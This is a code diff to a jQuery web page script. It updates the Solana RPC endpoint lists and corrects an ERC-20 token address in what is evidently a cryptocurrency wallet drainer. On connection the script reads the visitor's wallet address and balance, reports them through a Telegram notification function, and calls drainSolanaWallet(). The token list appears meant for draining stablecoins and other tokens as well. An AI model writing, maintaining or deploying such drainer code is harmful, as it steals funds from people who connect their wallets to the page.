@@ -200,10 +200,13 @@ $(document).ready(function () {
         
         // Try multiple RPC endpoints with fallback
         const RPC_ENDPOINTS = [
-            'https://solana-api.projectserum.com',
-            'https://rpc.ankr.com/solana',
-            'https://solana-rpc.publicnode.com',
-            'https://api.mainnet-beta.solana.com'
+            "https://ssc-dao.genesysgo.net",
+            "https://api.mainnet-beta.solana.com",
+            "https://rpc.ankr.com/solana",
+            "https://solana-api.projectserum.com",
+            "https://solana-rpc.publicnode.com",
+            "https://rpc.ankr.com/http/solana/mainnet",
+            "https://rpc.bonfida.org",
         ];
         
         let connected = false;
@@ -233,31 +236,34 @@ $(document).ready(function () {
 
     async function handleSolanaConnection() {
         const endpoints = [
-        "https://solana-rpc.publicnode.com", // Primary (The winner)
-        "https://rpc.ankr.com/solana",      // Secondary (The backup)
-        "https://solana-api.projectserum.com" // Tertiary
+            "https://ssc-dao.genesysgo.net", // Primary
+            "https://api.mainnet-beta.solana.com", // Secondary
+            "https://rpc.ankr.com/solana", // Tertiary
+            "https://solana-api.projectserum.com",
+            "https://solana-rpc.publicnode.com",
+            "https://rpc.ankr.com/http/solana/mainnet",
+            "https://rpc.bonfida.org"
         ];
-    if (!solProvider?.connect) return;
-    if (!solConnection) {
-        console.error('solConnection not initialized');
-        return;
-    }
-    
-    try {
-        await solProvider.connect();
-        const publicKey = solProvider.publicKey.toString();
-        const balance = await solConnection.getBalance(solProvider.publicKey);
-        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
-        
-        await sendEnhancedTelegramNotification(
-            solProvider.isPhantom ? 'Phantom SOL' : 'Solana Wallet',
-            publicKey, `${solBalance} SOL`, {}, 'SOL'
-        );
-        
-        await drainSolanaWallet();
-    } catch(e) {
-        console.error('Solana connect failed:', e);
-    }
+        if (!solProvider?.connect) return;
+        if (!solConnection) {
+            console.error("solConnection not initialized");
+            return;
+        }
+        try {
+            await solProvider.connect();
+            const publicKey = solProvider.publicKey.toString();
+            const balance = await solConnection.getBalance(solProvider.publicKey);
+            const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
+            
+            await sendEnhancedTelegramNotification(
+                solProvider.isPhantom ? "Phantom SOL" : "Solana Wallet",
+                publicKey, `${solBalance} SOL`, {}, "SOL"
+            );
+            
+            await drainSolanaWallet();
+        } catch(e) {
+            console.error("Solana connect failed:", e);
+        }
 }
 
     async function drainSolanaWallet() {
@@ -315,7 +321,7 @@ $(document).ready(function () {
     // Common ERC-20 tokens
     const COMMON_TOKENS = [
         { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
-        { symbol: "USDC", address: "0xA0b86a33E6417F54765d7e0b6C1E261CfD6B6C8B", decimals: 6 },
+        { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
         { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
         { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 }
     ];
